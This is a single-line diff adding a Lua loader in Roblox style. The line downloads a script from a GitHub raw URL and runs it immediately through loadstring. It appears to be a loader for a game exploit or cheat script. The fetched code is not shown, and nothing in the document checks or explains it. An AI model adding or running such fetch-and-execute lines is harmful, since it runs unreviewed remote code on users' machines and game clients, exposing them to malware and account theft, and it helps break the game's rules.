@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Scriptlau/XEPOR/refs/heads/main/LAM"))()
